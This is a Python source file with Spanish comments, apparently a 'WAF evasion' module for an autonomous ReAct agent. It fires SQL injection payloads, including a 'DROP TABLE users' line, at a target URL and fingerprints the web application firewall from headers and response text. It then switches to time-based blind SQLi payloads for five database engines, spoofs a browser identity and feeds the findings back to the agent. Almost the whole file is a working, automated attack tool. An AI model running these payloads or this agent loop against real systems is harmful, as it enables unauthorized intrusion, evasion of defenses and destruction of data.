"""
============================================================================
WAF EVASION MODULE — Heurísticas Adaptativas para el Agente ReAct
============================================================================
Módulo de ejecución de red con detección de WAF y mutación automática
de vectores de ataque hacia Time-Based Blind SQLi.

Flujo:
  1. Lanzar inyecciones básicas contra el objetivo
  2. Analizar status codes + headers → inferir presencia de WAF
  3. Si WAF detectado → detener vector básico → mutación a Blind SQLi
  4. Seleccionar payloads adaptativos según motor de BD subyacente
  5. Medir latencia asíncrona para validación empírica de vulnerabilidad
============================================================================
"""

import asyncio
import aiohttp
import time
import json
import os
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


# ============================================================================
# CONSTANTES Y CONFIGURACIÓN
# ============================================================================

# Umbral de respuestas 403 consecutivas para inferir WAF
WAF_DETECTION_THRESHOLD = 3

# Margen de tolerancia para validación de Time-Based SQLi (ms)
# Si inyectamos SLEEP(5), esperamos >= 4500ms (tolerancia de red)
TIMING_TOLERANCE_MS = 500

# Cabeceras conocidas de WAFs populares
WAF_SIGNATURE_HEADERS = {
    "x-sucuri-id":        "Sucuri WAF",
    "x-sucuri-cache":     "Sucuri WAF",
    "server: cloudflare": "Cloudflare WAF",
    "cf-ray":             "Cloudflare WAF",
    "x-cdn":              "Imperva/Incapsula",
    "x-iinfo":            "Imperva/Incapsula",
    "x-akamai-transformed": "Akamai Kona WAF",
    "x-amz-cf-id":        "AWS CloudFront + WAF",
    "x-aws-waf":          "AWS WAF",
    "server: bigip":      "F5 BIG-IP ASM",
    "x-denied-reason":    "Barracuda WAF",
    "x-dotdefender-denied": "dotDefender WAF",
}

# Patrones en el cuerpo de respuesta que delatan un WAF
WAF_BODY_SIGNATURES = [
    "access denied",
    "blocked by",
    "web application firewall",
    "request blocked",
    "forbidden",
    "automated request",
    "security policy",
    "your request has been blocked",
    "attention required",    # Cloudflare challenge page
    "checking your browser", # Cloudflare
    "ddos protection",
]

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


# ============================================================================
# ENUMS Y MODELOS
# ============================================================================

class DBEngine(Enum):
    """Motores de BD soportados para mutación de payloads."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


class AttackPhase(Enum):
    """Fases del vector de ataque."""
    BASIC_SQLI = "basic_sqli"
    WAF_DETECTED = "waf_detected"
    TIME_BASED_BLIND = "time_based_blind"
    CONFIRMED_VULNERABLE = "confirmed_vulnerable"
    TARGET_HARDENED = "target_hardened"


@dataclass
class WAFProfile:
    """Perfil del WAF detectado en el objetivo."""
    detected: bool = False
    name: str = "Unknown"
    confidence: float = 0.0
    consecutive_403s: int = 0
    signature_headers: list = field(default_factory=list)
    body_matches: list = field(default_factory=list)


@dataclass
class TimingResult:
    """Resultado de una prueba de inyección basada en tiempo."""
    payload: str = ""
    db_engine: DBEngine = DBEngine.UNKNOWN
    injected_delay_sec: float = 5.0
    measured_latency_ms: float = 0.0
    http_status: int = 0
    is_vulnerable: bool = False
    response_headers: dict = field(default_factory=dict)


@dataclass
class ScanReport:
    """Reporte acumulado del escaneo WAF + SQLi."""
    target_url: str = ""
    phase: AttackPhase = AttackPhase.BASIC_SQLI
    waf: WAFProfile = field(default_factory=WAFProfile)
    timing_results: list = field(default_factory=list)
    inferred_db_engine: DBEngine = DBEngine.UNKNOWN
    total_requests: int = 0
    findings: list = field(default_factory=list)


# ============================================================================
# PAYLOADS
# ============================================================================

# Inyecciones SQL básicas (fase 1 — para provocar al WAF)
BASIC_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "1' AND 1=1 --",
    "admin' --",
    "' OR 1=1#",
    "1; DROP TABLE users --",
]

# Payloads de Time-Based Blind SQLi por motor de BD
TIME_BASED_PAYLOADS = {
    DBEngine.MYSQL: [
        ("' OR SLEEP({delay})-- -",                           "SLEEP"),
        ("' OR IF(1=1,SLEEP({delay}),0)-- -",                 "IF+SLEEP"),
        ("1' AND (SELECT SLEEP({delay}))-- -",                "SELECT SLEEP"),
        ("' UNION SELECT SLEEP({delay}),NULL,NULL-- -",       "UNION SLEEP"),
        ("1' AND BENCHMARK(5000000,SHA1('test'))-- -",        "BENCHMARK"),
    ],
    DBEngine.POSTGRESQL: [
        ("'; SELECT pg_sleep({delay})--",                     "pg_sleep"),
        ("' OR (SELECT pg_sleep({delay}))::text='1'--",       "cast pg_sleep"),
        ("1' AND pg_sleep({delay}) IS NOT NULL--",            "IS NOT NULL"),
        ("' || (SELECT pg_sleep({delay}))::text || '",        "concat pg_sleep"),
    ],
    DBEngine.MSSQL: [
        ("'; WAITFOR DELAY '00:00:0{delay_int}'--",          "WAITFOR DELAY"),
        ("1' AND 1=1; WAITFOR DELAY '00:00:0{delay_int}'--", "AND WAITFOR"),
        ("'; IF(1=1) WAITFOR DELAY '00:00:0{delay_int}'--",  "IF WAITFOR"),
    ],
    DBEngine.ORACLE: [
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",  "DBMS_PIPE"),
        ("' AND 1=DBMS_LOCK.SLEEP({delay})--",                "DBMS_LOCK"),
    ],
    DBEngine.SQLITE: [
        ("' AND 1=randomblob({delay}00000000)--",             "randomblob"),
    ],
}


# ============================================================================
# DETECCIÓN DE WAF
# ============================================================================

def analyze_response_for_waf(
    status_code: int,
    headers: dict,
    body: str,
    waf_profile: WAFProfile,
) -> WAFProfile:
    """
    Analiza exhaustivamente los códigos de estado y cabeceras HTTP
    de una respuesta para inferir la presencia de un WAF.

    Heurísticas:
      - 403 Forbidden recurrente → probable WAF
      - Cabeceras de firma conocida (cf-ray, x-sucuri-id, etc.)
      - Patrones en el cuerpo de la respuesta (challenge pages, etc.)
    """
    # ── Heurística 1: 403 recurrentes ──
    if status_code == 403:
        waf_profile.consecutive_403s += 1
        if waf_profile.consecutive_403s >= WAF_DETECTION_THRESHOLD:
            waf_profile.detected = True
            waf_profile.confidence = max(waf_profile.confidence, 0.75)
    else:
        # Reset parcial: un 200 entre 403s reduce la sospecha
        waf_profile.consecutive_403s = max(0, waf_profile.consecutive_403s - 1)

    # ── Heurística 2: Cabeceras de firma ──
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    for sig_key, waf_name in WAF_SIGNATURE_HEADERS.items():
        # Algunas firmas incluyen "server: valor"
        if ":" in sig_key:
            header_name, header_val = sig_key.split(":", 1)
            header_name = header_name.strip()
            header_val = header_val.strip()
            if header_name in headers_lower and header_val in headers_lower[header_name]:
                waf_profile.detected = True
                waf_profile.name = waf_name
                waf_profile.confidence = max(waf_profile.confidence, 0.90)
                if sig_key not in waf_profile.signature_headers:
                    waf_profile.signature_headers.append(sig_key)
        else:
            if sig_key in headers_lower:
                waf_profile.detected = True
                waf_profile.name = waf_name
                waf_profile.confidence = max(waf_profile.confidence, 0.85)
                if sig_key not in waf_profile.signature_headers:
                    waf_profile.signature_headers.append(sig_key)

    # ── Heurística 3: Patrones en body ──
    body_lower = body.lower()
    for pattern in WAF_BODY_SIGNATURES:
        if pattern in body_lower:
            waf_profile.detected = True
            waf_profile.confidence = max(waf_profile.confidence, 0.70)
            if pattern not in waf_profile.body_matches:
                waf_profile.body_matches.append(pattern)

    # ── Heurística 4: Status codes propios de WAFs ──
    # 406 Not Acceptable, 429 Too Many Requests, 503 con challenge
    if status_code in (406, 429, 503) and any(p in body_lower for p in WAF_BODY_SIGNATURES):
        waf_profile.detected = True
        waf_profile.confidence = max(waf_profile.confidence, 0.80)

    return waf_profile


def infer_db_engine_from_errors(body: str) -> DBEngine:
    """
    Intenta inferir el motor de BD subyacente a partir de mensajes de error
    en las respuestas HTTP (error-based fingerprinting).
    """
    body_lower = body.lower()
    engine_signatures = {
        DBEngine.MYSQL:      ["mysql", "mariadb", "you have an error in your sql syntax",
                              "warning: mysql", "mysqli"],
        DBEngine.POSTGRESQL: ["postgresql", "pg_query", "pg_exec", "psql",
                              "unterminated quoted string", "syntax error at or near"],
        DBEngine.MSSQL:      ["microsoft sql server", "mssql", "sqlsrv",
                              "unclosed quotation mark", "incorrect syntax near"],
        DBEngine.ORACLE:     ["ora-", "oracle", "pl/sql"],
        DBEngine.SQLITE:     ["sqlite", "sqlite3", "near \""],
    }

    for engine, signatures in engine_signatures.items():
        for sig in signatures:
            if sig in body_lower:
                return engine

    return DBEngine.UNKNOWN


# ============================================================================
# EJECUCIÓN ASÍNCRONA DE PETICIONES HTTP
# ============================================================================

async def send_request(
    session: aiohttp.ClientSession,
    url: str,
    payload: str,
    param: str = "id",
    method: str = "GET",
) -> tuple:
    """
    Envía una petición HTTP con el payload inyectado y mide la latencia
    con precisión de milisegundos usando time.perf_counter().

    Returns:
        (status_code, headers_dict, body_text, latency_ms)
    """
    # Inyectar payload en el parámetro vulnerable
    if method.upper() == "GET":
        target = f"{url}?{param}={payload}"
        request_kwargs = {"url": target}
    else:
        target = url
        request_kwargs = {"url": target, "data": {param: payload}}

    try:
        start = time.perf_counter()

        async with session.request(method.upper(), **request_kwargs) as resp:
            body = await resp.text()
            elapsed_ms = (time.perf_counter() - start) * 1000

            headers = dict(resp.headers)
            return (resp.status, headers, body, elapsed_ms)

    except asyncio.TimeoutError:
        elapsed_ms = (time.perf_counter() - start) * 1000
        return (0, {}, f"[TIMEOUT] Request exceeded configured timeout", elapsed_ms)
    except aiohttp.ClientError as e:
        return (0, {}, f"[CONNECTION ERROR] {str(e)}", 0.0)


# ============================================================================
# FASE 1: INYECCIONES BÁSICAS (PROVOCACIÓN DE WAF)
# ============================================================================

async def phase_basic_sqli(
    session: aiohttp.ClientSession,
    target_url: str,
    param: str,
    report: ScanReport,
) -> ScanReport:
    """
    Lanza inyecciones SQL básicas para provocar una respuesta del WAF.
    Analiza cada respuesta buscando firmas de WAF y fingerprinting de BD.
    Si detecta bloqueo defensivo recurrente (403), detiene este vector.
    """
    report.phase = AttackPhase.BASIC_SQLI
    print(f"\n{'='*60}")
    print(f"  FASE 1: Inyecciones SQL Básicas (Provocación WAF)")
    print(f"  Target: {target_url}  |  Param: {param}")
    print(f"{'='*60}")

    for i, payload in enumerate(BASIC_SQLI_PAYLOADS):
        report.total_requests += 1
        status, headers, body, latency = await send_request(
            session, target_url, payload, param
        )

        print(f"\n  [{i+1}/{len(BASIC_SQLI_PAYLOADS)}] Payload: {payload[:50]}...")
        print(f"    HTTP {status} | Latencia: {latency:.0f}ms")

        # Analizar para WAF
        report.waf = analyze_response_for_waf(status, headers, body, report.waf)

        # Intentar fingerprint de BD
        if report.inferred_db_engine == DBEngine.UNKNOWN:
            detected_engine = infer_db_engine_from_errors(body)
            if detected_engine != DBEngine.UNKNOWN:
                report.inferred_db_engine = detected_engine
                print(f"    [!] Motor de BD inferido por errores: {detected_engine.value}")
                report.findings.append(
                    f"DB engine fingerprinted: {detected_engine.value} "
                    f"(via error-based, payload #{i+1})"
                )

        # ── DECISIÓN: Si el WAF es detectado, detener este vector ──
        if report.waf.detected:
            print(f"\n  [WAF DETECTADO] {report.waf.name} "
                  f"(confianza: {report.waf.confidence:.0%})")
            print(f"    403s consecutivos: {report.waf.consecutive_403s}")
            print(f"    Firmas de cabecera: {report.waf.signature_headers}")
            print(f"    Patrones en body:   {report.waf.body_matches}")
            print(f"  [STOP] Deteniendo vector de inyección básica.")

            report.phase = AttackPhase.WAF_DETECTED
            report.findings.append(
                f"WAF detected: {report.waf.name} "
                f"(confidence: {report.waf.confidence:.0%}, "
                f"after {report.total_requests} requests)"
            )
            return report

        # Delay entre requests para no saturar
        await asyncio.sleep(0.3)

    print("\n  [INFO] Fase básica completada sin detección de WAF.")
    return report


# ============================================================================
# FASE 2: MUTACIÓN → TIME-BASED BLIND SQLi
# ============================================================================

async def phase_time_based_blind(
    session: aiohttp.ClientSession,
    target_url: str,
    param: str,
    report: ScanReport,
    injected_delay: float = 5.0,
) -> ScanReport:
    """
    Mutación programática: cambia a Time-Based Blind SQLi.
    Inyecta cargas útiles de retraso adaptadas al motor de BD
    y mide la latencia asíncrona para validación empírica.

    Validación positiva si:
      - HTTP 200 OK
      - Latencia medida >= (delay_inyectado - tolerancia)
    """
    report.phase = AttackPhase.TIME_BASED_BLIND

    print(f"\n{'='*60}")
    print(f"  FASE 2: Time-Based Blind SQLi (Mutación Adaptativa)")
    print(f"  Delay inyectado: {injected_delay}s | Tolerancia: {TIMING_TOLERANCE_MS}ms")
    print(f"{'='*60}")

    # ── Decidir qué motores de BD probar ──
    if report.inferred_db_engine != DBEngine.UNKNOWN:
        # Si ya sabemos el motor, atacar solo ese
        engines_to_test = [report.inferred_db_engine]
        print(f"  [INFO] Motor de BD ya identificado: {report.inferred_db_engine.value}")
        print(f"         Usando payloads específicos para este motor.")
    else:
        # Si no sabemos, probar los 3 principales en orden de popularidad
        engines_to_test = [DBEngine.MYSQL, DBEngine.POSTGRESQL, DBEngine.MSSQL]
        print(f"  [INFO] Motor de BD desconocido. Probando: "
              f"{', '.join(e.value for e in engines_to_test)}")

    # ── Medir baseline de latencia (sin inyección) ──
    print(f"\n  [BASELINE] Midiendo latencia normal del servidor...")
    baseline_samples = []
    for _ in range(3):
        _, _, _, lat = await send_request(session, target_url, "1", param)
        baseline_samples.append(lat)
        await asyncio.sleep(0.2)

    baseline_ms = sum(baseline_samples) / len(baseline_samples) if baseline_samples else 0
    print(f"  [BASELINE] Latencia promedio del servidor: {baseline_ms:.0f}ms")

    # Umbral mínimo de detección: delay_inyectado - tolerancia
    detection_threshold_ms = (injected_delay * 1000) - TIMING_TOLERANCE_MS

    # ── Iterar por cada motor de BD ──
    for engine in engines_to_test:
        payloads = TIME_BASED_PAYLOADS.get(engine, [])
        if not payloads:
            continue

        print(f"\n  ── Motor: {engine.value.upper()} ({len(payloads)} payloads) ──")

        for j, (payload_template, technique) in enumerate(payloads):
            # Formatear payload con el delay configurado
            payload = payload_template.format(
                delay=injected_delay,
                delay_int=int(injected_delay),
            )

            report.total_requests += 1
            print(f"\n    [{j+1}/{len(payloads)}] Técnica: {technique}")
            print(f"    Payload: {payload}")

            status, headers, body, latency_ms = await send_request(
                session, target_url, payload, param
            )

            print(f"    HTTP {status} | Latencia: {latency_ms:.0f}ms "
                  f"(esperado >= {detection_threshold_ms:.0f}ms)")

            # ── Registrar resultado ──
            result = TimingResult(
                payload=payload,
                db_engine=engine,
                injected_delay_sec=injected_delay,
                measured_latency_ms=latency_ms,
                http_status=status,
                response_headers=headers,
            )

            # ── VALIDACIÓN EMPÍRICA ──
            # Positivo si: la latencia medida es >= al delay inyectado menos la
            # tolerancia de red, Y el servidor no nos bloqueó (HTTP 200 o 5xx)
            latency_matches_delay = latency_ms >= detection_threshold_ms
            status_is_valid = status in (200, 500, 302, 301)  # 5xx puede indicar ejecución
            not_baseline_noise = latency_ms > (baseline_ms + (injected_delay * 1000 * 0.5))

            if latency_matches_delay and status_is_valid and not_baseline_noise:
                result.is_vulnerable = True
                report.phase = AttackPhase.CONFIRMED_VULNERABLE
                report.inferred_db_engine = engine

                finding = (
                    f"CONFIRMED TIME-BASED BLIND SQLi: "
                    f"engine={engine.value}, technique={technique}, "
                    f"injected={injected_delay}s, measured={latency_ms:.0f}ms, "
                    f"HTTP {status}"
                )
                report.findings.append(finding)

                print(f"    ╔══════════════════════════════════════════════╗")
                print(f"    ║  ✓ VULNERABILIDAD CONFIRMADA EMPÍRICAMENTE  ║")
                print(f"    ║  Motor: {engine.value:<10} | Técnica: {technique:<15} ║")
                print(f"    ║  Delay inyectado: {injected_delay}s              ║")
                print(f"    ║  Latencia medida: {latency_ms:.0f}ms              ")
                print(f"    ╚══════════════════════════════════════════════╝")

            report.timing_results.append(result)

            # Si ya confirmamos, no necesitamos más payloads de este motor
            if result.is_vulnerable:
                break

            await asyncio.sleep(0.5)

        # Si confirmamos con este motor, no probar otros
        if report.phase == AttackPhase.CONFIRMED_VULNERABLE:
            break

    if report.phase != AttackPhase.CONFIRMED_VULNERABLE:
        print(f"\n  [INFO] No se confirmó vulnerabilidad Time-Based con los motores probados.")
        report.phase = AttackPhase.TARGET_HARDENED
        report.findings.append("Time-based blind SQLi: no vulnerability confirmed after full scan")

    return report


# ============================================================================
# ORQUESTADOR PRINCIPAL DE ESCANEO WAF
# ============================================================================

async def run_waf_evasion_scan(
    target_url: str,
    param: str = "id",
    injected_delay: float = 5.0,
    request_timeout: float = 30.0,
    proxy: Optional[str] = None,
) -> ScanReport:
    """
    Ejecuta el escaneo completo de evasión WAF con mutación adaptativa.

    Flujo:
      1. Fase básica: inyecciones SQL simples para provocar WAF
      2. Si WAF detectado: mutación a Time-Based Blind SQLi
      3. Validación empírica por latencia asíncrona

    Args:
        target_url:      URL del objetivo (ej: http://target/page.php)
        param:           Parámetro HTTP vulnerable (ej: "id")
        injected_delay:  Segundos de delay para payloads Time-Based
        request_timeout: Timeout por request en segundos
        proxy:           Proxy HTTP/SOCKS opcional (ej: "http://127.0.0.1:8080")

    Returns:
        ScanReport con todos los hallazgos
    """
    report = ScanReport(target_url=target_url)

    # Configurar timeout del cliente: debe ser mayor que el delay inyectado
    client_timeout = aiohttp.ClientTimeout(
        total=max(request_timeout, injected_delay + 15)
    )

    connector_kwargs = {}
    if proxy:
        print(f"[Config] Usando proxy: {proxy}")

    # Headers para parecer un navegador real
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

    print(f"\n{'#'*60}")
    print(f"  WAF EVASION SCANNER — Heurísticas Adaptativas")
    print(f"  Target: {target_url}")
    print(f"  Param:  {param}")
    print(f"  Delay:  {injected_delay}s")
    print(f"{'#'*60}")

    async with aiohttp.ClientSession(
        timeout=client_timeout,
        headers=default_headers,
    ) as session:
        # ── FASE 1: Inyecciones básicas ──
        report = await phase_basic_sqli(session, target_url, param, report)

        # ── DECISIÓN DE MUTACIÓN ──
        if report.waf.detected or report.phase == AttackPhase.WAF_DETECTED:
            print(f"\n  [MUTACIÓN] WAF detectado → Cambiando a Time-Based Blind SQLi")
            print(f"  [MUTACIÓN] Los payloads básicos fueron bloqueados por {report.waf.name}.")
            print(f"  [MUTACIÓN] Cambiando estrategia para evadir filtros de patrón...")

            # ── FASE 2: Time-Based Blind ──
            report = await phase_time_based_blind(
                session, target_url, param, report, injected_delay
            )
        else:
            # Si no hay WAF, igual ejecutar Time-Based para completar el escaneo
            print(f"\n  [INFO] No se detectó WAF. Ejecutando fase Time-Based igualmente...")
            report = await phase_time_based_blind(
                session, target_url, param, report, injected_delay
            )

    return report


# ============================================================================
# GENERADOR DE REPORTE PARA EL AGENTE ReAct
# ============================================================================

def format_scan_report(report: ScanReport) -> str:
    """
    Formatea el ScanReport como una observación legible para el agente ReAct.
    Este texto se inyecta en el historial como 'Observación' del ciclo.
    """
    lines = [
        "",
        "=" * 60,
        "  REPORTE DE ESCANEO WAF — OBSERVACIÓN DEL AGENTE",
        "=" * 60,
        f"  Target:           {report.target_url}",
        f"  Fase final:       {report.phase.value}",
        f"  Total requests:   {report.total_requests}",
        f"  Motor BD inferido: {report.inferred_db_engine.value}",
        "",
        "  ── WAF ──",
        f"  Detectado: {'SÍ' if report.waf.detected else 'NO'}",
    ]

    if report.waf.detected:
        lines.extend([
            f"  Nombre:      {report.waf.name}",
            f"  Confianza:   {report.waf.confidence:.0%}",
            f"  Firmas:      {', '.join(report.waf.signature_headers) or 'N/A'}",
            f"  Body match:  {', '.join(report.waf.body_matches) or 'N/A'}",
        ])

    if report.timing_results:
        lines.append("")
        lines.append("  ── Resultados Time-Based Blind SQLi ──")
        for r in report.timing_results:
            vuln_mark = "✓ VULNERABLE" if r.is_vulnerable else "✗"
            lines.append(
                f"    [{vuln_mark}] {r.db_engine.value:12} | "
                f"HTTP {r.http_status} | "
                f"{r.measured_latency_ms:.0f}ms | "
                f"{r.payload[:45]}..."
            )

    if report.findings:
        lines.append("")
        lines.append("  ── Hallazgos ──")
        for i, f in enumerate(report.findings, 1):
            lines.append(f"    {i}. {f}")

    lines.append("")
    lines.append("=" * 60)
    return "\n".join(lines)


def save_report_to_disk(report: ScanReport, filename: str = "waf_scan_report.json"):
    """Persiste el reporte en disco como JSON para el Ralph Loop."""
    path = os.path.join(SCRIPT_DIR, filename)
    data = {
        "target_url": report.target_url,
        "phase": report.phase.value,
        "total_requests": report.total_requests,
        "inferred_db_engine": report.inferred_db_engine.value,
        "waf": {
            "detected": report.waf.detected,
            "name": report.waf.name,
            "confidence": report.waf.confidence,
            "consecutive_403s": report.waf.consecutive_403s,
            "signature_headers": report.waf.signature_headers,
            "body_matches": report.waf.body_matches,
        },
        "timing_results": [
            {
                "payload": r.payload,
                "db_engine": r.db_engine.value,
                "injected_delay_sec": r.injected_delay_sec,
                "measured_latency_ms": r.measured_latency_ms,
                "http_status": r.http_status,
                "is_vulnerable": r.is_vulnerable,
            }
            for r in report.timing_results
        ],
        "findings": report.findings,
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"\n[Report] Guardado en: {path}")


# ============================================================================
# ENTRY POINT INDEPENDIENTE (para testing sin el agente ReAct)
# ============================================================================

async def main():
    """
    Punto de entrada para ejecución independiente.
    Uso: python waf_evasion.py [target_url] [param]
    """
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com/artists.php"
    param = sys.argv[2] if len(sys.argv) > 2 else "artist"

    print(f"[*] Iniciando escaneo WAF adaptativo contra: {target}")
    report = await run_waf_evasion_scan(
        target_url=target,
        param=param,
        injected_delay=5.0,
    )

    # Mostrar reporte formateado
    print(format_scan_report(report))

    # Persistir a disco
    save_report_to_disk(report)


if __name__ == "__main__":
    asyncio.run(main())
